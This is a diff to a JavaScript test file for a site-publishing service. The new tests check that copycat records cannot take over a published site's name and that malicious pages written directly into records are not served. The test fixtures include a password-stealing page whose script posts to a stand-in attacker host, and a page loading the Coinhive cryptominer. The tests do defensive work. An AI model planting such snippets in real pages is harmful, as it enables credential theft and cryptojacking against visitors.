@@ -225,6 +225,38 @@ assert(b.html.includes("has been removed") && !b.html.includes("<h1>Inline</h1>"
 [s, b] = await getSite("nobody");
 assert(s === 404, "unknown site 404");
 
+// ---- copycat records and direct writes (cloudflare-lib/pagesource.js) ----
+{
+  // KV that keeps publish()'s owner metadata, like Cloudflare's.
+  const meta = new Map();
+  const kv2 = {
+    ...kv,
+    async put(k, v, o) { writes++; store.set(k, String(v)); meta.set(k, (o && o.metadata) || null); },
+    async getWithMetadata(k) { return { value: store.get(k) ?? null, metadata: meta.get(k) ?? null }; },
+  };
+  const env2 = { PUBLISHED_HTML: kv2 };
+  const get2 = async (name) => j(gsh.onRequestPost({ request: req({ name }), env: env2 }));
+  await kv2.put("site:shop", "<html><body><h1>Real shop</h1></body></html>", { metadata: { owner: "u1" } });
+  entities.PublishedSite.push(
+    // A copycat written straight into Base44 by someone else, listed first.
+    { id: "c1", name: "shop", html: "<html><body><h1>Fake shop</h1></body></html>", created_by_id: "u666", created_date: "2020-01-01" },
+    { id: "r1", name: "shop", html: "https://nebuluxai.pages.dev/published/site/shop", created_by_id: "u1", created_date: "2026-01-01", ownerName: "Real Owner" },
+  );
+  [s, b] = await get2("shop");
+  assert(b.html.includes("Real shop") && !b.html.includes("Fake shop") && b.id === "r1" && b.ownerName === "Real Owner", "a copycat record can't take over a published site's name");
+  entities.PublishedSite = entities.PublishedSite.filter((r) => r.id !== "r1");
+  [s, b] = await get2("shop");
+  assert(s === 404, "once the owner deletes their record, a copycat doesn't bring the name back");
+  const direct = await serve.onRequestGet({ params: { kind: "site", name: "shop" }, env: env2 });
+  assert(direct.status === 404, "the /published/ address doesn't serve it for a copycat either");
+  entities.PublishedSite.push({ id: "d1", name: "freerobux", html: '<html><body><input type="password"><script>fetch("https://steal.example/x",{method:"POST"})</script></body></html>', created_by_id: "u666" });
+  [s, b] = await get2("freerobux");
+  assert(b.html.includes("has been removed") && !b.html.includes("steal.example"), "a password-stealing page written straight into a record is not served");
+  entities.PublishedSite.push({ id: "d2", name: "miner", html: '<html><body><script src="https://coinhive.com/lib/coinhive.min.js"></script></body></html>', created_by_id: "u666" });
+  [s, b] = await get2("miner");
+  assert(b.html.includes("has been removed") && !b.html.includes("coinhive"), "a page that would be refused at publish isn't served from a record either");
+}
+
 // ---- link-preview tags ----
 const { withShareTags } = await import(R + "cloudflare-lib/pageserve.js");
 const { stripInjected } = await import(R + "cloudflare-lib/injected.js");
